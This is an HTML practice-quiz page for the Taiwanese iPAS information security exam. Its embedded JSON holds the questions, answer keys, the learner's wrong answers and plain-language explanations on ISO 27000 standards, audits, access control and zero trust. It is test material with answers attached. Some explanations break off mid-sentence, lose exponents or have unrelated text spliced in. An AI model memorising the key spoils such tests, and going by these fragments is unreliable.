<!doctype html>
<html lang="zh-Hant">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="color-scheme" content="light">
<title>錯題重做・資安</title>
<style>
:root { color-scheme:light; --ink:#20312f; --muted:#556663; --paper:#f4f7f4; --line:#ccd8d2; --green:#14633e; --red:#a92a32; }
* { box-sizing:border-box; }
body { margin:0; background:var(--paper); color:var(--ink); font-family:-apple-system,"PingFang TC","Noto Sans TC",sans-serif; font-size:19px; line-height:1.65; }
main { max-width:800px; margin:auto; padding:24px 20px 60px; overflow-wrap:anywhere; }
[hidden] { display:none !important; }
h1 { font-size:clamp(30px,6vw,40px); margin:12px 0; line-height:1.35; }
h2 { font-size:24px; line-height:1.6; margin:16px 0; }
h3 { font-size:21px; margin:0 0 8px; }
p { margin:10px 0; }
button,input { font:inherit; }
button { min-height:56px; padding:13px 18px; border:1px solid var(--line); border-radius:14px; background:#fff; color:var(--ink); cursor:pointer; touch-action:manipulation; white-space:normal; overflow-wrap:anywhere; }
button:disabled { cursor:default; opacity:.5; }
button:focus-visible,input:focus-visible { outline:3px solid #2866ba; outline-offset:4px; }
button.primary { background:var(--green); color:white; border-color:var(--green); font-weight:650; }
button.wide { width:100%; }
button.quiet { background:transparent; }
.eyebrow { color:var(--green); font-size:15px; font-weight:700; letter-spacing:.12em; }
.muted { color:var(--muted); }
.small { font-size:16px; }
.panel { padding:22px; background:#fff; border:1px solid var(--line); border-radius:20px; margin:20px 0; }
.stack { display:grid; gap:12px; }
.row { display:flex; gap:12px; flex-wrap:wrap; align-items:center; }
.row > * { flex:1 1 150px; min-width:0; }
fieldset { border:0; padding:0; margin:20px 0; min-width:0; }
legend { font-weight:650; margin-bottom:10px; }
.choice { display:flex; align-items:center; gap:10px; min-height:56px; padding:10px 12px; border:1px solid var(--line); border-radius:12px; cursor:pointer; background:#fff; }
.choice input { flex:none; width:23px; height:23px; accent-color:var(--green); margin:0; }
.choice:has(input:checked) { background:#eaf4ed; border-color:var(--green); }
.toolbar { display:flex; justify-content:space-between; align-items:center; gap:12px; margin-bottom:16px; }
.toolbar button { flex:none; font-size:16px; }
.progress-text { font-weight:650; font-size:20px; }
progress { display:block; width:100%; height:10px; margin:12px 0 20px; accent-color:var(--green); }
.source { color:var(--muted); font-size:17px; }
.context { background:#eaf0f7; border-left:4px solid #7b97b1; padding:16px 18px; border-radius:8px; margin:20px 0; }
.option { width:100%; display:flex; align-items:flex-start; gap:12px; text-align:left; font-size:20px; line-height:1.6; }
.letter { flex:none; font-weight:750; width:24px; }
.option-copy { min-width:0; flex:1; }
.option.correct { border:2px solid var(--green); background:#e4f3e8; color:#105334; }
.option.incorrect { border:2px solid var(--red); background:#fce8e8; color:#8e1f29; }
.option:disabled { opacity:1; }
.badge { display:block; font-weight:700; font-size:17px; margin-top:5px; }
.feedback { margin-top:22px; border:1px solid var(--line); border-radius:16px; padding:20px; background:#fff; }
.outcome { font-size:23px; font-weight:750; }
.outcome.good { color:var(--green); }
.outcome.bad { color:var(--red); }
.navigation { margin-top:24px; }
.rate { font-size:56px; line-height:1.2; font-weight:750; color:var(--green); margin:14px 0; }
.bank-stat { border-top:1px solid var(--line); padding:12px 0; }
.wrong-item { text-align:left; width:100%; }
.wrong-item .source { display:block; }
.notice { background:#fff4d9; border:1px solid #b9913d; padding:14px 18px; border-radius:12px; margin-bottom:20px; font-size:17px; }
@media(max-width:420px) { main { padding:18px 14px 40px; } .panel { padding:17px; } .toolbar { align-items:flex-start; } .toolbar button { padding:10px 12px; } h2 { font-size:22px; } }
@media(prefers-reduced-motion:no-preference) { button { transition:background-color .12s ease; } }
</style>
</head>
<body>
<main>
<div id="storage-notice" class="notice" role="status" hidden></div>
<section id="home" aria-labelledby="home-title">
  <div class="eyebrow">iPAS 資訊安全工程師初級</div>
  <h1 id="home-title" tabindex="-1">錯題，再練一次。</h1>
  <p class="muted">一次一題，選完就看解析。慢慢來，把觀念記牢。</p>
  <div class="panel">
    <h2>共 <span id="total-count"></span> 題單選題</h2>
    <p id="bank-counts" class="muted small"></p>
    <fieldset><legend>題目順序</legend><div class="stack">
      <label class="choice"><input type="radio" name="order" value="ordered" checked>照題庫順序</label>
      <label class="choice"><input type="radio" name="order" value="random">隨機順序</label>
    </div></fieldset>
    <button id="start-all" class="primary wide">全部重做</button>
    <fieldset><legend>只做指定題庫（可複選）</legend><div class="row">
      <label class="choice"><input type="checkbox" name="bank" value="A" checked>題庫 A</label>
      <label class="choice"><input type="checkbox" name="bank" value="B" checked>題庫 B</label>
      <label class="choice"><input type="checkbox" name="bank" value="C" checked>題庫 C</label>
    </div></fieldset>
    <button id="start-selected" class="wide"></button>
  </div>
  <div id="resume-area" class="panel" hidden>
    <p id="resume-summary"></p>
    <div class="stack"><button id="resume" class="primary">繼續上次</button><button id="clear-progress" class="quiet">清除進度</button></div>
    <p class="small muted">開始新一輪會取代上次進度。</p>
  </div>
  <p class="small muted">離線即可練習。桌機可按 1～4 作答。進度只儲存在目前的瀏覽器中。</p>
  <noscript><div class="notice">這個測驗需要 JavaScript。若目前只看到檔案預覽，請以支援 JavaScript 的瀏覽器開啟 HTML。</div></noscript>
</section>
<section id="quiz" aria-labelledby="question-title" hidden>
  <div class="toolbar"><div><div id="progress-text" class="progress-text"></div><div id="correct-count" class="small muted"></div></div><button id="go-home">回首頁</button></div>
  <progress id="progress-bar" value="0" max="1" aria-label="已作答進度"></progress>
  <p id="question-source" class="source"></p>
  <div id="question-context" class="context" hidden><h3>題組共用題幹</h3><p id="context-text"></p></div>
  <h2 id="question-title" tabindex="-1"></h2>
  <div id="options" class="stack" role="group" aria-labelledby="question-title"></div>
  <div id="feedback" class="feedback" aria-live="polite" hidden></div>
  <div class="row navigation"><button id="previous">上一題</button><button id="next" class="primary" hidden>下一題</button></div>
  <button id="back-results" class="wide quiet navigation" hidden>回到本次結果</button>
</section>
<section id="results" aria-labelledby="results-title" hidden>
  <div class="eyebrow">這一輪完成了</div><h1 id="results-title" tabindex="-1">看看這次的成果</h1>
  <div class="panel"><p>本次答對率</p><div id="result-rate" class="rate"></div><p id="result-summary"></p><div id="bank-results"></div></div>
  <div class="stack"><button id="retry-wrong" class="primary">只重做這次答錯的</button><button id="results-home">回首頁</button></div>
  <h2>這次答錯的題目</h2><p id="wrong-hint" class="muted"></p><div id="wrong-list" class="stack"></div>
</section>
</main>
<script id="quiz-data" type="application/json">{"fingerprint":"f7010b541e58f74d52b183871b4c9b25a97aefbaaead7056250c7b980b246b9a","questions":[{"id":"資安題庫A.pdf::1-2-e4e8de2d2d52d29d","bank":"A","pdf":"資安題庫A.pdf","qid":"1-2-e4e8de2d2d52d29d","page":1,"number":2,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"資訊安全管理系統是在於管理面的要求，藉由審查機制、事件的回應及內部稽核來預防資訊安全事件或是降低其損失的風險，請問下列敘述何者 「不」正確？","options":{"A":"需要管理階層的承諾及提供相關支援，表達對資訊安全管理系統的支援","B":"採用規劃(Plan)、執行(Do) 、檢查(Check)及行動(Act) 等四個階段的改進流程進行","C":"資訊安全目標無需具體量化，導入解決方案、強化資訊安全防護為指導方針","D":"內部稽核的成果報告需要在管理審查會議中進行檢討"},"explanation":"這就像公司訂年度業績目標，不能只是喊口號「我們會努力賺錢！」（無需具體量化），而是要訂出「今年營業額要提升 15%」（必須具體量化）。資安目標也一樣，例如「系統年度斷線時間不得超過 2 小時」，有數字才能追蹤。","group_context":null},{"id":"資安題庫A.pdf::2-7-07ccbd211824b6a5","bank":"A","pdf":"資安題庫A.pdf","qid":"2-7-07ccbd211824b6a5","page":2,"number":7,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"近年來，民間企業數位網通服務應用加驟，讓企業的資安單位從原本的技術支援角色轉變為重要的策略單位，而資訊安全「管理」更拉高至「治理」 位階，下列哪一項可以作為企業治理資訊安全的框架及指引？","options":{"A":"ISO/IEC27004","B":"ISO/IEC27011","C":"ISO/IEC27014","D":"ISO/IEC27017"},"explanation":"「管理」是裡長在巡邏社區（執行層面）；「治理」則是總統與內閣在制訂國家防衛戰略（董事會、老闆層面）。ISO27014 就是專門教企業大老闆、董事會如何站在最高權力核心，去「治理」與監督公司資安方向的最高指導原則。","group_context":null},{"id":"資安題庫A.pdf::2-8-7ac0298eb4114454","bank":"A","pdf":"資安題庫A.pdf","qid":"2-8-7ac0298eb4114454","page":2,"number":8,"multiple":false,"answers":["B"],"chosen_last":["A"],"stem":"若要驗證資訊安全管理系統，且能有效達成稽核作業，如稽核方案之管理、內部稽核之執行等，可參考下列哪一項標準？","options":{"A":"ISO27002","B":"ISO27007","C":"ISO27017","D":"ISO27037"},"explanation":"學校期末考需要有監考老師和評分標準， ISO27007 就是專門寫給 「資安監考老師（稽核員）」看的指南，教他們如何去檢查別人的公司、 如何執行內部稽核才算公正專業。","group_context":null},{"id":"資安題庫A.pdf::3-10-fad4aa9ec1c1af3e","bank":"A","pdf":"資安題庫A.pdf","qid":"3-10-fad4aa9ec1c1af3e","page":3,"number":10,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"在 ISO27000 系列標準中，下列何者為建置資訊安全管理系統的實作指引(Information security management systems—Guidance)？","options":{"A":"ISO/IEC27001","B":"ISO/IEC27002","C":"ISO/IEC27003","D":"ISO/IEC27004"},"explanation":"27001 告訴你：「你要蓋一棟安全的房子！」（要求標準） 27003 則是親切的「建築施工說明書」（建置實作指引），一步一","group_context":null},{"id":"資安題庫A.pdf::4-7-3803b9b21e91345b","bank":"A","pdf":"資安題庫A.pdf","qid":"4-7-3803b9b21e91345b","page":4,"number":7,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"下列何者「不」是提升服務可用性（Availability）的有效策略？","options":{"A":"導入內容遞送網路(Content Delivery Network, CDN) 服務","B":"建置應用程式防火牆","C":"設計自動擴展機制","D":"規劃伺服器負載平衡架構"},"explanation":" (A)CDN 就像在全台各縣市設連鎖便利商店，讓大家不用跑去臺北總店買，分散人流；  (C)自動擴展像餐廳排隊人變多時，店長馬上多擺幾張桌子；  (D)負載平衡也是分流。這些都能有效防範系統被塞爆。  而(B)「應用程式防火牆（WAF ）」主要是用來擋下駭客的惡意攻擊與","group_context":null},{"id":"資安題庫A.pdf::5-2-8f8ed8042ef57b8f","bank":"A","pdf":"資安題庫A.pdf","qid":"5-2-8f8ed8042ef57b8f","page":5,"number":2,"multiple":false,"answers":["B"],"chosen_last":["D"],"stem":"請問主管機關對所屬機構（如：金管會對銀行）執行之稽核，稱為下列何者？","options":{"A":"第一方（FirstParty）稽核","B":"第二方（SecondParty）稽核","C":"協力廠商（ThirdParty）稽核","D":"聯合/合併（Joint）稽核"},"explanation":"我們用「家庭關係」來比喻這三種稽核： o 第一方：兒子自己檢查房間有沒有收拾乾淨（內部稽核）。 o 第二方：媽媽（有管轄權的主管、或出錢的客戶）來檢查兒子的房間 （主管機關或客戶稽核）。 o 協力廠商：請外面的專業清潔公司、認證機構來發給房間乾淨證書 （獨立驗證機構稽核）。 所以金管會管銀行，屬於有管轄權的上級檢查下級，是「第二方稽核」。","group_context":null},{"id":"資安題庫A.pdf::5-8-0036a58a79b9699b","bank":"A","pdf":"資安題庫A.pdf","qid":"5-8-0036a58a79b9699b","page":5,"number":8,"multiple":false,"answers":["B"],"chosen_last":["A"],"stem":"勒索病毒（Ransomware ）使用對稱式加密技術與非對稱式加密技術來進行加密電腦內的檔案，讓使用者無法使用，此現象主要影響資訊系統的何種特性？","options":{"A":"機密性（Confidentiality）","B":"可用性（Availability ）","C":"完整性（Integrity）","D":"鑑別性（Authenticity ）"},"explanation":"勒索病毒就像壞人跑到你家，用一條很粗的鐵鍊和密碼鎖，把你的保險箱跟大門反鎖起來，讓你「看得到卻打不開、無法使用」。檔案雖然還在、內容沒被偷看或改掉，但因為你完全無法使用它，這最主要重創的就是系統與資料的「可用性」。","group_context":null},{"id":"資安題庫A.pdf::6-5-ca973e01080e3735","bank":"A","pdf":"資安題庫A.pdf","qid":"6-5-ca973e01080e3735","page":6,"number":5,"multiple":false,"answers":["A"],"chosen_last":["C"],"stem":"資訊安全管理系統(ISMS)中的風險評估(Risk Assessment)作業，屬於規劃(Plan)、執行(Do)、檢查(Check) 及行動(Act)循環中的哪一部分？","options":{"A":"規劃(Plan)","B":"執行(Do)","C":"檢查(Check)","D":"行動(Act)"},"explanation":"蓋房子之前，工程師要先評估「這塊地會不會有地震、會不會地層下陷」（風險評估），然後根據評估結果來設計藍圖。所以在開始動手做任何防護之前，先找出問題在哪裡的「風險評估」，屬於一開始的 Plan （規劃）階段。","group_context":null},{"id":"資安題庫A.pdf::9-3-21d32be2a05d9dfe","bank":"A","pdf":"資安題庫A.pdf","qid":"9-3-21d32be2a05d9dfe","page":9,"number":3,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"ISO/IEC27002 於 2022 年 2 月發布最新版本，該版本與 2013 年版本的差異之一，是增加控制措施的屬性標籤，其中一項是「類別」，共有預防、偵測與矯正等 3 項，請問系統資料備份比較偏向下列哪一類型？","options":{"A":"預防 Preventive","B":"偵測 Detective 及矯正","C":"矯正 Corrective","D":"預防及偵測"},"explanation":"o 預防：叫你開車繫安全帶、不要超速（阻止災難發生）。 o 偵測：車上的超速警報器嗶嗶叫（發現問題）。 o 矯正：車子爆胎了，趕快從後車廂拿出「備胎」裝上去，讓車子重新可以開（事後回復原狀）。系統資料備份（ Backup）的目的，就是等哪天電腦中毒、檔案壞掉時用來「還原」的。這就像備胎，屬於事情發生後的「矯正（Corrective）」措施。","group_context":null},{"id":"資安題庫A.pdf::11-3-2fa4937495dd5dd6","bank":"A","pdf":"資安題庫A.pdf","qid":"11-3-2fa4937495dd5dd6","page":11,"number":3,"multiple":false,"answers":["B"],"chosen_last":["A"],"stem":"規劃縱深防禦(Defense in Depth)時，我們常會採用多種不同面向的管控措施(Controls)，下列何者屬於預防性存取管控措施 (Preventative Access Control)？","options":{"A":"側錄系統(Session recording system)","B":"加密(Encryption)","C":"備份(Backup)","D":"入侵偵測系統( Intrusion detection system)"},"explanation":"「預防性」就是事情發生前就阻止你。(A) 側錄與(D)偵測像是錄影機，是事中或事後「偵測」用的；(C)備份是被偷被刪後的「回復」措施； (B)加密就像是把日記用密碼鎖鎖起來。","group_context":null},{"id":"資安題庫A.pdf::13-3-8d927f622c0334a5","bank":"A","pdf":"資安題庫A.pdf","qid":"13-3-8d927f622c0334a5","page":13,"number":3,"multiple":false,"answers":["D"],"chosen_last":["C"],"stem":"在進行職務規劃時，下列何種情境宜優先考量是否有職務區隔之設計？","options":{"A":"執行資安內部稽核時，業務人員負責查核資訊單位的資安事故通報作業流程","B":"程式設計人員於程式上架更新時，應在負責更新系統程式的資訊部門待命","C":"採購人員於廠商下單訂購前，應在庫存系統確認庫存數量","D":"人力資源部門主管，負責人資資訊系統之更新與維護"},"explanation":"人力資源主管既是「業務使用單位」，如果又讓他去負責「系統更新與維護」，他就可以自己改系統幫自己加薪、改假別。這就叫裁判兼球員，最需要進行職務區隔！","group_context":null},{"id":"資安題庫A.pdf::15-3-5b7c3e07529e38c4","bank":"A","pdf":"資安題庫A.pdf","qid":"15-3-5b7c3e07529e38c4","page":15,"number":3,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"有關 NIST 網路安全框架（Cyber security Framework,CSF）所參考適用於 IT 與 OT 環境之國際標準或指引。下列敘述何者錯誤？","options":{"A":"ISO/IEC27001:2013","B":"ISA62443-2-1:2009","C":"NISTSP800-72","D":"ISA62443- 3-3:2013"},"explanation":"NISTCSF 設計時參考了許多各領域的「武林秘笈」。(A) ISO27001 是萬用的 IT 資安總綱；(B) 與(D)的 ISA/IEC62443 系列是專門保護工廠生產線、自來水廠等自動化控制系統（OT）的權威標準。而(C)NISTSP800 -72 是早年針對個人數位助理（PDA ）的資安指引，不屬於 CSF 核心參考的 IT/OT 國際通用大標。","group_context":null},{"id":"資安題庫A.pdf::16-2-881ceb68f9281ed9","bank":"A","pdf":"資安題庫A.pdf","qid":"16-2-881ceb68f9281ed9","page":16,"number":2,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"關於網路區隔，下列敘述何者較「不」可行？","options":{"A":"依安全等級、組織或特定的目的進行區隔","B":"以實體網路或邏輯網路區隔","C":"明確的定義無線區域網路的周界（Boundary）並加以控制","D":"周界使用閘道如防火牆或過濾路由器（Filtering Router）加以控制"},"explanation":"「無線網路（ Wi-Fi）」是透過無線電波在空氣中傳播的。既然是電波，你就沒辦法在空氣中「精準地畫一條物理邊界」說電波絕對不能飄過這條線（不可行）。 我們頂多只能透過密碼加密、身份驗證或隔絕網段來控制它，無法像實體圍牆那樣鎖死 Wi-Fi 的物理周界。","group_context":null},{"id":"資安題庫A.pdf::17-5-3d9e59103a25e0b0","bank":"A","pdf":"資安題庫A.pdf","qid":"17-5-3d9e59103a25e0b0","page":17,"number":5,"multiple":false,"answers":["D"],"chosen_last":["A"],"stem":"關於監控中心（Security Operations Center,SOC）的發展與建置規劃，下列敘述何者「不」正確？","options":{"A":"SOC 建置重點於主動化、自動化、智慧化，主要的關鍵技術是巨量資料分析與機器學習的導入","B":"SOC 核心三元素為：人員、程式、科技，而科技的導入在於輔助人員依相關作業程式完成任務","C":"SOC 提供監控與管理資訊安全系統與設備、執行定期網路安全掃描、防火牆、防毒系統之架設、設定與管理等服務","D":"SOC 工作包含應用程式碼的解析、程式壓力測試與報告"},"explanation":"SOC（資安監控中心）就像是公司的「中央保全監控室」。保全大隊負責的是看監視器畫面的警訊、處理突發入侵事件、巡邏各項防禦設備 （A、B、C ）。 (D)「解析程式碼、做程式壓力測試」，那是軟體開發工程師（RD）或品管測試員（QA）在寫軟體時的工作，不屬於保全監控中心的職責。","group_context":null},{"id":"資安題庫A.pdf::18-3-f655b37d76ecc480","bank":"A","pdf":"資安題庫A.pdf","qid":"18-3-f655b37d76ecc480","page":18,"number":3,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"承上題，在此架構下，下列何者「不」是定期需要執行的資安維運任務？","options":{"A":"定期備份與演練","B":"每半年做一次防毒掃描","C":"每兩年做一次資料備份","D":"不需向主管機關報告"},"explanation":"在資安維運中，「每兩年才做一次資料備份」簡直是慢性自殺。如果兩年內電腦壞掉或被勒索病毒加密，公司就會直接損失兩年份的所有心血。備份通常是每天或每週都要做的事，絕對不能每兩年才做一次。","group_context":"某公司的資安人員依據公司設備狀況，規劃了圖中的網路架構設計圖： • 網際網路（Internet）進來後通過路由器（ Router）。 • 中間有一台防火牆（Firewall）。 • 防火牆接出了 DMZ 區，但 DMZ 區裡面竟然放了一台包含 IIS（網頁伺服器）+MS-SQL（資料庫）的綜合伺服器。 • 另一邊則是 OFFICE（辦公室內網），接了無線分享器、Mac 、筆電和印表機。"},{"id":"資安題庫A.pdf::18-4-906700e5446ab423","bank":"A","pdf":"資安題庫A.pdf","qid":"18-4-906700e5446ab423","page":18,"number":4,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"若要設定防火牆內對外的連線，僅開放對外的服務及網頁瀏覽，下列何者正確？","options":{"A":"Allow all","B":"Allow http port80","C":"Allow http port 1443","D":"Deny smtp 125"},"explanation":"題目要求「開放網頁瀏覽」。在網路世界中，傳統標準網頁瀏覽 （HTTP）專用的通訊大門（Port 號碼）就是 Port80（加密的 HTTPS 則是 443，選項 C 寫 1443 是錯的）。所以要讓大家能正常看網頁，防火牆必須放行 Allow http port80。","group_context":"某公司的資安人員依據公司設備狀況，規劃了圖中的網路架構設計圖： • 網際網路（Internet）進來後通過路由器（ Router）。 • 中間有一台防火牆（Firewall）。 • 防火牆接出了 DMZ 區，但 DMZ 區裡面竟然放了一台包含 IIS（網頁伺服器）+MS-SQL（資料庫）的綜合伺服器。 • 另一邊則是 OFFICE（辦公室內網），接了無線分享器、Mac 、筆電和印表機。"},{"id":"資安題庫A.pdf::19-1-a488f54d578129e2","bank":"A","pdf":"資安題庫A.pdf","qid":"19-1-a488f54d578129e2","page":19,"number":1,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"關於資訊安全模型（Security Models ）中的強制存取控制 （Mandatory Access Control, MAC），下列敘述何者「不」正確？","options":{"A":"依據事前定義（Pre-defined）主體（Subject）的安全等級和被存取物件 （Object）機敏等級來決定是否可以存取","B":"安全強度較自主存取控制（Discretionary Access Control, DAC）高","C":"傳統的 Unix 系統使用者（Users ）、群組（Groups）和讀- 寫-執行（Read- Write- Execute）管控，即為 MAC 的一種實作","D":"安全政策（Policy）由安全政策員（Security policy administrator）集中管控"},"explanation":"傳統 Unix/Linux 的 chmod 檔案擁有者自己決定讀寫執行權限給誰） 是典型的 DAC（自主存取控制）。 MAC 非常嚴格，一般檔案擁有者不能自己作主。","group_context":null},{"id":"資安題庫A.pdf::26-6-d9b2a79ec72ebe44","bank":"A","pdf":"資安題庫A.pdf","qid":"26-6-d9b2a79ec72ebe44","page":26,"number":6,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"請問下列對於生物特徵身份認證（Biometric Authentication ）的描述何者較「不」正確？","options":{"A":"指紋辨識的準確度較人臉辨識的準確度高","B":"視網膜辨識準確率高，然而特徵擷取十分不便是其難以普及的原因","C":"錯誤拒絕率又稱為型 II(Type II)錯誤，意指原本合法的使用者在身份認證時被拒絕","D":"臉形辨識常容易因身材及體重的變化而產生誤判，因此會需要定期重新取樣與訓練"},"explanation":"型 I(Type I)錯誤：叫做「錯誤拒絕（FRR）」。就像你明明是主人，但洗完澡指紋變皺，手機不讓你開鎖。這是開除自己人（Type I）。 型 II(Type II)錯誤：叫做「錯誤接受（FAR ）」。就像小偷來刷臉，手機居然以為是你而開鎖了。這是放行壞人（Type II ），資安上 Type II 最致命。因此(C)將錯誤拒絕歸為型 II 是寫反了。","group_context":null},{"id":"資安題庫A.pdf::28-15-2b73fe78488ef85f","bank":"A","pdf":"資安題庫A.pdf","qid":"28-15-2b73fe78488ef85f","page":28,"number":15,"multiple":false,"answers":["A"],"chosen_last":["D"],"stem":"若想採用暴力攻擊的方式破解以小寫英文和數字所組成的八位密碼，至多總共要嘗試多少次？","options":{"A":"(26+10)8","B":"268 + 108","C":"(10+26)X8","D":"C8(10+26)"},"explanation":"小寫英文有 26 個，數字有 10 個，所以每一個密碼位置都有 26 + 10 = 36 種可能。總共有 8 個位置，根據排列組合，每一位都有 36 種選擇， 總數就是 368 =(26+10)8。","group_context":null},{"id":"資安題庫A.pdf::29-2-08c0db3c11dd5d46","bank":"A","pdf":"資安題庫A.pdf","qid":"29-2-08c0db3c11dd5d46","page":29,"number":2,"multiple":false,"answers":["D"],"chosen_last":["A"],"stem":"關於 NIST SP 800- 207 零信任架構的基本規則敘述，下列何項錯誤？","options":{"A":"所有的通訊都需要被保護，無論其所在之網路位置","B":"須觀察與量測所擁有資產與相關資產，其完整性與安全態勢","C":"運算服務(Computing Service)和資料來源(Data Sources)皆可視為資源","D":"應先蒐集資產、網路架構等現狀，建立資產清冊"},"explanation":"根據 NIST SP 800- 207，(A)(B)(C)均是基礎的核心原則（所有通訊皆加密、不分內外網，所有資料和服務都是資源）。(D 選項錯誤) 企業盡可能收集關於資產、網路架構和通訊目前狀態的資訊，並將其用於改善整體安全態勢，屬於持續性的動態資產狀態資訊收集與動態分析，而非單純的靜態現況調查與建立清冊。","group_context":null},{"id":"資安題庫A.pdf::29-16-8176d5a86df33a35","bank":"A","pdf":"資安題庫A.pdf","qid":"29-16-8176d5a86df33a35","page":29,"number":16,"multiple":false,"answers":["D"],"chosen_last":["B"],"stem":"某公司新網頁資訊系統上線，內含客戶相關資料，經資安風險分析，有帳號暴力破解風險，再經後續的安全測試，發現帳戶登錄機制可容許一直重複嘗試登入，關於上述狀況，下列何者作法最「不」適當？","options":{"A":"設定帳戶在嘗試失敗多次後鎖定一段時間","B":"設定密碼政策，設定的密碼至少需有 12 個字元","C":"設定帳戶在嘗試失敗時，寄送 eMail 由郵件通知","D":"設定帳戶連線時，強制使用 Https 安全連線"},"explanation":"題目核心問題是「系統可以無限次重複嘗試登入」，這也就是暴力破解的溫床。Https 是用來防竊聽與確保資料傳輸完整性的，對於阻止「重複嘗試登入」的暴力破解行為毫無防禦效果。最精準對症下藥的防禦是 (A) （錯 5 次就鎖帳號 15 分鐘，駭客就沒辦法暴力連試）。而(B)增加密碼長度雖然能增加破解難度，但如果系統依然「不限制嘗試次數」，機器跑遲早還是會破，並沒有根本解決「重複嘗試」的程式漏洞；而(C)只發郵件而不阻止他繼續嘗試，等主人起床看到郵件時金庫早就被搬空了。 零信任（Zero Trust, ZTA) ）  舊式資安叫「內網大平原（城堡模式）」，只要你過了外牆大門護城河，進到城堡內部就可以隨便逛。  零信任的原則叫：「永不信任，一律驗證！」 就像高防禦的生化實驗室：不管你是誰、待在內網還是外網，你每走過一道門、每開一個房間、每摸一次資料，都要重新刷卡、重新對指紋，隨時都在緊盯你的環境安全。","group_context":null},{"id":"資安題庫A.pdf::32-2-643adfcc423209bd","bank":"A","pdf":"資安題庫A.pdf","qid":"32-2-643adfcc423209bd","page":32,"number":2,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"請問在建置行動式醫療車及行動加護病房的雲端即時監護系統的零信任時，下列何者「不」是零信任(Zero Trust) 架構的原則？","options":{"A":"不管與哪個網路位置的裝置通訊都需要確保安全","B":"對於個別企業資源的存取要求，應以連線為基礎去判斷是否許可","C":"所有的資料、設備與運算服務，都要被當作是主體(Subject)","D":"所有的資源的身分鑑別與授權機制，都要依監控結果動態決定"},"explanation":"在資安模型中，資料、設備、雲端伺服器是被存取的「標的物」， 專有名詞叫做「客體/資源（Object/Resource）」。而來存取它們的人或發出請求的程式，才叫做「主體（ Subject）」。把資源當作主體在名詞定義上是完全寫反的。","group_context":"某醫療機構發生多起駭客入侵，其行動式醫療車及行動加護病房的雲端即時監視系統遭攻破，駭客甚至遠端改了點滴流速高達原設定的 50 倍（危及生命）。該機構規劃導入零信任架構強化安全。"},{"id":"資安題庫A.pdf::33-3-534080873b234197","bank":"A","pdf":"資安題庫A.pdf","qid":"33-3-534080873b234197","page":33,"number":3,"multiple":false,"answers":["B"],"chosen_last":["A"],"stem":"關於建置行動式醫療車及行動加護病房雲端即時監護系統的零信任架構與角色敘述，下列何者錯誤？","options":{"A":"政策引擎(Policy Engine, PE)與政策管理者(Policy Administrator, PA)位於政策決策點(Policy Decision Point, PDP) 中","B":"政策落實點(Policy Enforcement Point, PEP)，可以是網路防火牆或監視系統","C":"持續診斷與緩解系統(Continuous Diagnostics and Mitigation, CDM)的工作是持續收集企業數位資產的狀況，以作為政策引擎(Policy Engine, PE)評估放行與否的參考","D":"信賴評估演算法可以是條件(Criteria- based)為基礎或以分數 (Score-based) 為基礎"},"explanation":"NIST 定義中，(A)政策引擎 PE（決定放不放行）和政策管理者 PA （負責發出指令給閘門）兩者結合成大腦 PDP，完全正確。(C) 與(D)也是零信任評估信賴演算法的標準科學元件。而 PEP 是硬性阻斷與放行流量的 「關卡/閘門」（例如代理伺服器 Proxy、網路閘道網關），(B 選項錯誤) 監視系統「只有看、沒有擋」，無法即時在通訊路徑上「執行」或「落實」阻擋與放行決策，因此不能被視為 PEP。","group_context":"某醫療機構發生多起駭客入侵，其行動式醫療車及行動加護病房的雲端即時監視系統遭攻破，駭客甚至遠端改了點滴流速高達原設定的 50 倍（危及生命）。該機構規劃導入零信任架構強化安全。"},{"id":"資安題庫A.pdf::35-2-a64e9ffcec791468","bank":"A","pdf":"資安題庫A.pdf","qid":"35-2-a64e9ffcec791468","page":35,"number":2,"multiple":false,"answers":["D"],"chosen_last":["B"],"stem":"ISO/IEC 27005 於 2022 年 10 月發布最新版本，該版本與 2008 年版本的差異之一為風險識別的方式，其中 2008 年版為：基於 ______；2022 年版增加了：基於 ______。","options":{"A":"事件(event)；資產(asset)","B":"威脅(threat)；事件(event)","C":"資產(asset)；風險(risk )","D":"資產(asset)；事件(event)"},"explanation":"舊版（2008/2018）的 ISO 27005 Risk Assessment 主要是「以資產為基礎（Asset- based）」，先把資產列出來再找威脅。最新的 2022 年版為了對齊 ISO 31000，改為或增加了「以事件為基礎（Event- based）」的識別方式，更關注業務場景與事件發生的因果關係。","group_context":null},{"id":"資安題庫A.pdf::36-4-929800776324aabe","bank":"A","pdf":"資安題庫A.pdf","qid":"36-4-929800776324aabe","page":36,"number":4,"multiple":false,"answers":["A"],"chosen_last":["C"],"stem":"資訊安全管理系統（Information Security Management System, ISMS）中，下列何者為資訊分類的主要目標？","options":{"A":"確保資訊依其對組織的重要性，受到適當等級的保護","B":"確保與資訊有關的資產，已被正確的識別和記錄","C":"確保與資訊有關的資產，已被正確的盤點","D":"確保資訊資產於員工離職時，已經完整的歸還"},"explanation":"把資產「分類分級」（如：極機密、密、普通），主要就是為了精準配置資源。最重要的給它最強的防護，一般的給普通防護，這才叫( A)受到適當等級的保護。 (B)(C)是盤點的目標，(D) 是人事控管目標。","group_context":null},{"id":"資安題庫A.pdf::36-5-0ee55cf6a9660f86","bank":"A","pdf":"資安題庫A.pdf","qid":"36-5-0ee55cf6a9660f86","page":36,"number":5,"multiple":false,"answers":["D"],"chosen_last":["C"],"stem":"下列何者「不」屬於資訊資產分類中的服務資產？","options":{"A":"電力供應","B":"網路供應","C":"空調供應","D":"公用程式"},"explanation":"(A)(B)(C) 都是維持系統運作的基礎環境基礎「服務 （Services/Utilities）」。而(D) 公用程式（Utility 